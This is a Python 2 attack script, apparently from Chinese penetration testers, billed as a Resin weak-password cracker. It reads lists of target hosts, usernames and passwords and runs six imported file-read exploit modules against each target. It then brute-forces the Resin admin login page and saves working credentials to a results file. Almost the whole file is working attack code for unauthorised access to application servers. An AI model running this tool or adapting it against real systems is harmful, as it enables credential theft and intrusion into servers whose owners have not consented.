#coding=gbk
#author:wolf@future-sec&pt007@vip.sina.com
import urllib2
import base64,codecs

UrlFile=file('./resin1.txt') #url列表
UserFile=file('./resin_user.txt') #用户名列表
PassFile=file('./sql_pass.txt') #密码列表
#fp= codecs.open("./axis_success.txt","a") #成功利用后以增加的方式写入的文件，支持写入中文字符的方式
fp= codecs.open("./resin_success.txt","w") #成功利用后覆盖写入的文件，支持写入中文字符的方式
timeout=100
user_list=[]
pass_list=[]

while True:
    line = UserFile.readline()
    if len(line) == 0: # Zero length indicates EOF
        break
        #exit()             
    line=line.strip()
    #print line,
    user_list.append(line)

while True:
    line = PassFile.readline()
    if len(line) == 0: # Zero length indicates EOF
        break
        #exit()             
    line=line.strip()
    #print line,
    pass_list.append(line)

#判断页面是否存在:
def check(host,port):
    if port=='443':
        url = "https://%s" %(host)
    else:
        url = "http://%s:%d" %(host,int(port))
    error_i = 0
    res_code='404'
    i=1
    flag_list=['<th>Resin home:</th>','The Resin version','Resin Summary']
    #6个文件包含漏洞测试:
    while (i<7):
        try:
            info=''
            File_Read="resin_fileread%s" %(i)
            #print "\tFile_Read=",File_Read
            deploy = __import__(File_Read)
            re = deploy.run(host,port,timeout)
            if re:
                info += re
        except Exception,e:
            print e
            pass
        if  info:
            print  '\tYES|'+info
            fp.write(info)
            fp.flush()
        i+=1
    
    user_list=['admin']
    pass_list=['admin']
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    for user in user_list:
        for password in pass_list:
            try:
                PostStr='j_username=%s&j_password=%s'%(user,password)
                res = opener.open(url+'/resin-admin/j_security_check?j_uri=index.php',PostStr)
                #request = urllib2.Request(url+'/resin-admin/j_security_check?j_uri=status.php',PostStr)
                #res = urllib2.urlopen(request,timeout=timeout)
                res_html = res.read()
                res_code = res.code
                return 1
            except urllib2.HTTPError,e:
                #print "\terror info1:",e
                return 0
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 0
                continue
            except Exception as e: #缺省错误返回0
                print "\terror info2:",e
                return 0
    return 0

def checkScan(host,port):
    if port=='443':
        url = "https://%s" %(host)
    else:
        url = "http://%s:%d" %(host,int(port))
    error_i = 0
    res_code='404'
    info=''
    flag_list=['<th>Resin home:</th>','The Resin version','Resin Summary']
    print "\t%s/resin-admin/j_security_check?j_uri=index.php is living!" %(url)
    
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    for user in user_list:
        print "\tcurrent user [%s],pass's length [%d]" %(user,len(pass_list))
        for password in pass_list:
            try:
                PostStr='j_username=%s&j_password=%s'%(user,password)
                res = opener.open(url+'/resin-admin/j_security_check?j_uri=index.php',PostStr)
                res_html = res.read()
                res_code = res.code
            except urllib2.HTTPError,e:
                return 'NO'
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            except Exception as e: #缺省错误继续
                 print"\terro info3:",e
                 pass
            for flag in flag_list:
                if flag in res_html or int(res_code) == 408:
                    info = '%s/resin-admin //Resin Weak password %s:%s\n'%(url,user,password)
                    print  '\tYES|'+info
                    fp.write(info)
                    fp.flush() 
                    return 'YES|'+info
    return 'NO'

if __name__ == "__main__":
    #queue = Queue.Queue()
    print '''
    ----------------------------------------------------------------------------------------
        程序名称：resin弱口令破解程序v1.1,resin_crackpass.py
        程序作者：pt007@vip.sina.com
        程序用法：
    \tresin1.txt里面设置需要扫描的IP地址，如:10.110.123.30:8080 回车后输入下一个IP地址
    \tpython resin_crackpass.py
    \t扫描的结果会自动存入当前目录下的resin_success.txt文件!
    \t自动调用6种方式的文件读取漏洞进行测试！
    -----------------------------------------------------------------------------------------\n'''
    urllist=[]
    print "\tresin url list:"
    while True:
        line = UrlFile.readline()
        if len(line) == 0: # Zero length indicates EOF
            break
            #exit()             
        line=line.strip()
        #print line,
        urllist.append(line)
    UrlFile.close()
    for i in urllist:
        host,port=i.split(":")
        if(check(host,port)):
            checkScan(host,port)
    UserFile.close()
    PassFile.close()
    print "\tCrack password done,please type resin_success.txt!\n"
